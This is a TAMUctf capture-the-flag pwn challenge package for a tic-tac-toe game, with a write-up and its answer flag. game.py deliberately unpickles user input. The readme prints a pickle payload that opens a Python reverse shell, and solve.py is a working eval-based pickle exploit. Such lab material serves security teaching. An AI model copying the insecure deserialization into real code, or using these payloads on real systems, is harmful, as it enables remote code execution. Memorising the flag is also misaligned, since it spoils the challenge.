{
    "challenge.py": "from hacksport.operations import execute\nfrom hacksport.problem import Challenge, File\n\n\nclass Problem(Challenge):\n    def setup(self):\n        self.files = []\n\n    def generate_flag(self, random):\n        return r\"gigem{h3y_7h47_d035n'7_l00k_l1k3_4_p1ckl3d_54v3}\"\n",
    "Dockerfile": "FROM debian\n\nRUN apt-get update -y; apt-get install socat python3 -y\nCOPY game.py /pwn/game.py\nCOPY flag.txt /pwn/flag.txt\n\nWORKDIR /pwn\n\nEXPOSE 9397\n\nENTRYPOINT [\"sh\", \"-c\", \"exec socat -s TCP-LISTEN:9397,reuseaddr,fork EXEC:'python3 /pwn/game.py',stderr\"]\n",
    "flag.txt": "gigem{h3y_7h47_d035n'7_l00k_l1k3_4_p1ckl3d_54v3}",
    "game.py": "#!/usr/bin/python\nfrom itertools import product\nfrom random import randint\nimport sys\nfrom hashlib import sha256\nimport pickle\nimport base64\n\ndef check_winner(board):\n\tpositions_groups = (\n\t    [[(x, y) for y in range(3)] for x in range(3)] + # horizontals\n\t    [[(x, y) for x in range(3)] for y in range(3)] + # verticals\n\t    [[(d, d) for d in range(3)]] + # diagonal from top-left to bottom-right\n\t    [[(2-d, d) for d in range(3)]] # diagonal from top-right to bottom-left\n\t)\n\tfor pos in positions_groups:\n\t\tline = [board[a][b] for (a,b) in pos]\n\t\tif len(set(line)) == 1 and line[0] != \"_\":\n\t\t\tif line[0] == \"X\":\n\t\t\t\treturn \"X\"\n\t\t\telse:\n\t\t\t\treturn \"O\"\n\treturn \"_\"\n\nclass Game():\n\tdef __init__(self):\n\t\tself.board = [[\"_\" for a in range(3)] for b in range(3)]\n\t\tpass\n\n\n\tdef clear(self):\n\t\tprint(\"\\033c\", end=\"\")\n\n\tdef print_board(self):\n\t\tprint(f\"\u2554\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2557\")\n\t\tprint(f\"\u2551 {self.board[0][0]} \u2551 {self.board[0][1]} \u2551 {self.board[0][2]} \u2551\")\n\t\tprint(f\"\u2560\u2550\u2550\u2550\u256c\u2550\u2550\u2550\u256c\u2550\u2550\u2550\u2563\")\n\t\tprint(f\"\u2551 {self.board[1][0]} \u2551 {self.board[1][1]} \u2551 {self.board[1][2]} \u2551\")\n\t\tprint(f\"\u2560\u2550\u2550\u2550\u256c\u2550\u2550\u2550\u256c\u2550\u2550\u2550\u2563\")\n\t\tprint(f\"\u2551 {self.board[2][0]} \u2551 {self.board[2][1]} \u2551 {self.board[2][2]} \u2551\")\n\t\tprint(f\"\u255a\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u255d\")\n\n\tdef check_winner(self):\n\t\twinner = check_winner(self.board)\n\t\tif winner == \"X\":\n\t\t\treturn (False, winner)\n\t\telif winner == \"O\":\n\t\t\tprint(\"The computer won :(\")\n\t\t\treturn (False, winner)\n\t\tif all(self.board[a][b] != \"_\" for a, b in product(range(3),repeat=2)):\n\t\t\tprint(\"No moves left...\")\n\t\t\treturn (False, \"_\")\n\t\treturn (True, \"_\")\n\n\ndef play_game():\n\tgame = Game()\n\tdef player_turn():\n\t\tgame.clear()\n\t\tgame.print_board()\n\t\tprint(\"Enter move (0-indexed, row col): \")\n\t\twhile True:\n\t\t\tloc = input(\"> \").split(\" \")\n\t\t\tif len(loc) != 2:\n\t\t\t\tprint(\"invalid format\")\n\t\t\t\tcontinue\n\t\t\ttry:\n\t\t\t\trow, col = (int(loc[0]), int(loc[1]))\n\t\t\t\tif col > 2 or row > 2:\n\t\t\t\t\tprint(\"move out of bounds\")\n\t\t\t\t\tcontinue\n\t\t\t\tif game.board[row][col] != \"_\":\n\t\t\t\t\tprint(\"that space is already full!\")\n\t\t\t\t\tcontinue\n\t\t\t\tgame.board[row][col] = \"X\"\n\t\t\t\tbreak\n\t\t\texcept ValueError:\n\t\t\t\tprint(\"invalid integer literal\")\n\t\t\t\tcontinue\n\n\t\tgame.clear()\n\t\tgame.print_board()\n\t\tcont, winner = game.check_winner()\n\t\treturn cont\n\n\tdef ai_turn():\n\t\tcont, winner = game.check_winner()\n\t\twhile True:\n\t\t\trow, col = (randint(0,2), randint(0,2))\n\t\t\tif game.board[row][col] == \"_\":\n\t\t\t\tbreak\n\t\tgame.board[row][col] = \"O\"\n\t\tcont, winner = game.check_winner()\n\t\treturn cont\n\n\n\twhile player_turn() and ai_turn():\n\t\tpass\n\n\treturn \"X\" == check_winner(game.board)\n\nTARGET_NO = 133713371337\nwins = 0\n\nf = open(\"flag.txt\",\"r\")\nflag = f.read()\nf.close()\n\n\ndef menu():\n\tprint(f\"Welcome to my new game!  I bet you can't beat me {TARGET_NO} times!!  You've won {wins} times. \")\n\tprint(\"1. Play game\")\n\tprint(\"2. Redeem prize\")\n\tprint(\"3. Save progress\")\n\tprint(\"4. Load progress\")\n\tprint(\"5. Check stats\")\n\ndef get_hash(w):\n\tm = sha256()\n\tm.update((str(wins) + flag).encode())\n\treturn base64.b64encode(m.digest()).decode()\n\nmenu()\n\nwhile True:\n\tselection = input(\"> \")\n\n\tif selection == \"1\":\n\t\tif play_game():\n\t\t\twins += 1\n\t\tmenu()\n\telif selection == \"2\":\n\t\tif wins >= TARGET_NO:\n\t\t\tprint(f\"Great job!  You definitely deserve this: {flag}\")\n\t\t\tf.close()\n\t\t\tsys.exit()\n\t\telse:\n\t\t\tprint(f\"You don't have enough wins... you need {TARGET_NO-wins} more\")\n\t\tpass\n\telif selection == \"3\":\n\n\t\tdata = {\"wins\": wins, \"security\": get_hash(wins)}\n\t\tprint(f\"Here you go!  Come back and try again! \\\"{base64.b64encode(pickle.dumps(data)).decode()}\\\"\")\n\t\tpass\n\telif selection == \"4\":\n\t\tsave = input(\"What was the code I gave you last time? \")\n\t\tdata = pickle.loads(base64.b64decode(save))\n\n\t\tif get_hash(data['wins']) != data['security']:\n\t\t\tprint(\"Hey, the secret code I left isn't correct.  You aren't trying to cheat are you :/\")\n\t\t\tcontinue\n\t\telse:\n\t\t\twins = data['wins']\n\t\t\tprint(f\"Okay, that all checks out!  I'll mark you down as {wins} wins\")\n\t\tpass\n\telif selection == \"5\":\n\t\tprint(f\"You've won {wins} times, so you need {TARGET_NO-wins} more\")\n\telse:\n\t\tprint(\"That doesn't look like an option...\")\n\t\tcontinue\n",
    "Makefile": "CONTAINER := tictactoe\n\n\ndocker: Dockerfile\n\tdocker build -t $(CONTAINER) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name tictactoe -p 9397:9397 tictactoe\n\n.PHONY:\n",
    "problem.json": "{\n  \"name\": \"TicTacToe\",\n  \"category\": \"Pwn\",\n  \"description\": \"Hey, I made a tic tac toe game! If you can beat me enough times I'll give you a flag.\\n<a href='http://tamuctf.com/static-files/tictactoe'>tictactoe</a>\\n<code>openssl s_client -connect tamuctf.com:443 -servername tictactoe -quiet</code>\",\n  \"score\" : 150,\n  \"hints\": [\"\"],\n  \"walkthrough\": \"N/A\",\n  \"author\": \"Teddy Heinen\",\n  \"organization\": \"TAMUctf\",\n  \"event\": \"TAMUctf\"\n}\n\n",
    "readme.md": "# tic tac toe\n\nHey, I made a new game!  If you can beat me enough times I'll give you a flag. \n\n`nc challenges.tamuctf.com 9397`\n\n(provide game.py)\n\n## (very brief) dev description\n\nits a pickle RCE vuln\n\n## solution\n\nHEADS UP: you've found a *secret* **special** writeup that wouldn't work in the actual competition due to firewall\nconstraints. The specific payload used here doesn't work because it requires a reverse shell, which wasn't possible from\nthis particular challenge during the competition. However, a solving script which does not rely on this behaviour is\nprovided in [solve.py](solve.py), which was tested on infrastructure during the competition -- just in case. :)\n\n-----\n\nManual inspection of the `game.py` provided clearly indicates improper use of the [pickle library](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#whitebox-review_1).\n\nI have but one pickle payload that I throw at [literally everything pickle-y](https://addisoncrump.info/security/ctfs/smc3/wx01/).\n\n```\ncos\nsystem\n(S'python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"HAHA-NO-IP-FOR-YOU\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\\''\ntR.\n```\n\nThis spawns a reverse shell back to whatever target I like. Then, I simply execute `cat flag.txt` once I have the shell.\n\nThe solution provided by Teddy is far more elegant, but this gets the job done.\n\n```\ngigem{h3y_7h47_d035n'7_l00k_l1k3_4_p1ckl3d_54v3}\n```\n",
    "solve.py": "from pwn import *\nimport pickle\nimport base64\nimport re\n\nclass Exploit:\n    def __reduce__(self):\n        return eval, (\"print(open('flag.txt','r').read())\",)\n\n\npickled = pickle.dumps(Exploit())\np = remote(\"localhost\",4444)\np.sendline(str(4))\np.sendline(base64.urlsafe_b64encode(pickled))\nprint(re.search(\"(gigem{.*?})\", p.recvall().decode()).group(1))\n",
    "category": "pwn"
}